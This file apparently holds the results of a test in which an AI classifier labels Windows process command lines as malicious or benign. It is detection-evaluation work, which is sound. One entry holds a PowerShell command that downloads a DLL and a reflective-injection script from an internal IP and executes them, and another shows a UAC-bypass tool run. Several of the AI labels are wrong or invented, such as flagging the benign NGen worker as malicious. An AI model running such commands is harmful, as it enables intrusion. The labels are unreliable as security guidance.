+AI Determination: No, this command is not malicious. It is a command used to run the Disk Cleanup utility in Windows, which is used to free up disk space by deleting unnecessary files.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\devicecensus.exe" UserCxt
+
+AI Determination: It is not possible to determine if this command is malicious without additional context.
+
+_____
+
+Command Line Arg: C:\Users\ADMINI~1\AppData\Local\Temp\5FEBF83F-D960-46AB-9BE8-68AAB157F68D\dismhost.exe {143F72A4-AA40-4C21-9885-74CAD8FBD87F}
+
+AI Determination: It is not possible to determine if this command is malicious without additional context.
+
+_____
+
+Command Line Arg: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe -StartupEvent 1cc -InterruptEvent 0 -NGENProcess 1b8 -Pipe 1c8 -Comment "NGen Worker Process"
+
+AI Determination: Yes, this command is potentially malicious. It contains suspicious parameters that could be used to execute malicious code.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+
+AI Determination: No, this command is not malicious. It is a PowerShell command that is used to write a message to the console.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to run a background task on a Windows system.
+
+_____
+
+Command Line Arg: C:\Windows\system32\WerFault.exe -u -p 4544 -s 2964
+
+AI Determination: No, this command is not malicious. WerFault.exe is a Windows executable that is used to diagnose and troubleshoot Windows errors. The parameters in this command are likely related to the troubleshooting process.
+
+_____
+
+Command Line Arg: "C:\Program Files\Windows Defender\MpCmdRun.exe" -IdleTask -TaskName WdCleanup
+
+AI Determination: No, this command is not malicious. It is a command used to run Windows Defender's cleanup task.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\usoclient.exe" RefreshSettings
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to refresh Windows settings.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "$url=\"http://192.168.122.197:8888/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"file\",\"debugger.dll\");$PBytes = $wc.DownloadData($url);$wc1 = New-Object System.net.webclient;$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");IEX ($wc1.DownloadString($url));Invoke-ReflectivePEInjection -PBytes $PBytes -verbose"
+
+AI Determination: Yes, this command is malicious. It is attempting to download and execute a malicious file from a remote server.
+
+_____
+
+Command Line Arg: "C:\Users\Administrator\Akagi64.exe" 30 C:\Windows\System32\cmd.exe
+
+AI Determination: Yes, this command is potentially malicious. It appears to be attempting to run the Akagi64.exe file with the argument "30" and then execute the cmd.exe file with an unknown argument.
+
+_____
+
+Command Line Arg: "C:\Windows\System32\wsqmcons.exe"
+
+AI Determination: No, this command is not malicious. It is a legitimate Windows command that is used to launch the Windows Quality of Service (QoS) Management Console.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\rundll32.exe" C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to perform maintenance tasks on Windows systems.
+
+_____
+
+Command Line Arg: C:\Windows\system32\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to launch a COM surrogate process.
+
+_____
+
+Command Line Arg: "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:ShellFeedsUI.AppX88fpyyrd21w8wqe62wzsjh5agex7tf1e.mca
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to launch a Windows application.
+
+_____
+
+Command Line Arg: "C:\Program Files\Windows Defender\MpCmdRun.exe" -IdleTask -TaskName WdVerification
+
+AI Determination: No, this command is not malicious. It is a command used to run Windows Defender's idle task, which is used to verify the integrity of the Windows Defender files.
+
+_____
+
+Command Line Arg: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=entity_extraction_service.mojom.Extractor --lang=en-US --service-sandbox-type=entity_extraction --onnx-enabled-for-ee --mojo-platform-channel-handle=5512 --field-trial-handle=1588,i,15588918170266153223,9401790713667022256,131072 /prefetch:8
+
+AI Determination: No, this command does not appear to be malicious. It appears to be a command to launch Microsoft Edge with certain parameters.
+
+_____
+
+Command Line Arg: taskhostw.exe -RegisterUserDevice -NewAccount
+
+AI Determination: Yes, this command appears to be malicious. It is attempting to register a new user account without the user's permission.
+
+_____
+
+Command Line Arg: C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+
+AI Determination: No, this command is not malicious. It is a legitimate Windows command used to launch the Windows Management Instrumentation Provider Service.
+
+_____
